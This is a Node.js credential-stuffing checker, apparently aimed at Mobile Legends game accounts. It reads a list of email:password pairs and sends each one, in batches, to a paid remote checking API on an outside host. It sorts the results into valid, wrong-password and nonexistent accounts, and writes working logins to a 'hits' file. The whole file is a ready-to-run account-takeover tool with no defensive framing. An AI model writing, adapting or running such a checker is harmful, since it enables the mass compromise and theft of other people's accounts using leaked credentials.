const axios = require('axios');
const readline = require('readline');
const fs = require('fs');

const api = "http://dina.hidencloud.com:25598/mlbb";
const checkbal = "http://dina.hidencloud.com:25598/balance";
const reqmax = 20;

const COLORS = {
  green: '\x1b[32m',
  red: '\x1b[31m',
  blue: '\x1b[34m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  reset: '\x1b[0m'
};

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("ENTER FILE PATH: ", (filePath) => {
  if (!fs.existsSync(filePath)) {
    console.log(`${COLORS.red}File not found.${COLORS.reset}`);
    rl.close();
    return;
  }

  const accounts = fs.readFileSync(filePath, 'utf-8').split('\n').filter(line => line.trim());
  console.log(`${COLORS.cyan}TOTAL ACCOUNTS: ${accounts.length}${COLORS.reset}`);

  rl.question("ENTER YOUR KEY: ", async (apiKey) => {
    try {
      const balanceRes = await axios.get(`${checkbal}?apikey=${apiKey}`);
      const balance = balanceRes.data.balance;

      if (balance <= 0) {
        console.log(`${COLORS.red}YOU DON'T HAVE BALANCE TO CHECK!${COLORS.reset}`);
        rl.close();
        return;
      }

      console.log(`${COLORS.cyan}YOUR REMAINING BALANCE: ${balance}\nChecking...${COLORS.reset}`);

      const validAccounts = [];
      const hitsfile = `hiroshi-${Math.floor(Math.random() * 10000)}.txt`;

      const process = async (line) => {
        const [email, password] = line.split(':');
        if (!email || !password) {
          console.log(`${COLORS.yellow}${line} [ INVALID FORMAT ]${COLORS.reset}`);
          return;
        }

        try {
          const res = await axios.post(api, { email, password, apikey: apiKey });
          if (res.data.status === "success") {
            console.log(`${COLORS.green}${email}:${password} [ VALID ]${COLORS.reset}`);
            validAccounts.push(`${email}:${password}`);
          } else if (res.data.message.toLowerCase().includes("incorrect password")) {
            console.log(`${COLORS.red}${email}:${password} [ WRONG PASS ]${COLORS.reset}`);
          } else if (res.data.message.toLowerCase().includes("account does not exist")) {
            console.log(`${COLORS.blue}${email}:${password} [ NOT EXIST ]${COLORS.reset}`);
          } else {
            console.log(`${COLORS.yellow}${email}:${password} [ UNKNOWN ERROR ]${COLORS.reset}`);
          }
        } catch (err) {
          console.log(`${COLORS.red}REQUEST FAILED. STOPPING...${COLORS.reset}`);
          process.exit(1);
        }
      };

      const chunks = [];
      for (let i = 0; i < accounts.length; i += reqmax) {
        chunks.push(accounts.slice(i, i + reqmax));
      }

      for (const chunk of chunks) {
        await Promise.all(chunk.map(process));
      }

      if (validAccounts.length > 0) {
        fs.writeFileSync(hitsfile, validAccounts.join('\n'), 'utf-8');
        console.log(`${COLORS.green}\nValid accounts saved to ${hitsfile}${COLORS.reset}`);
      } else {
        console.log(`${COLORS.red}\nNo valid accounts found.${COLORS.reset}`);
      }
    } catch (err) {
      console.log(`${COLORS.red}Failed to check balance or invalid API key.${COLORS.reset}`);
    }

    rl.close();
  });
});
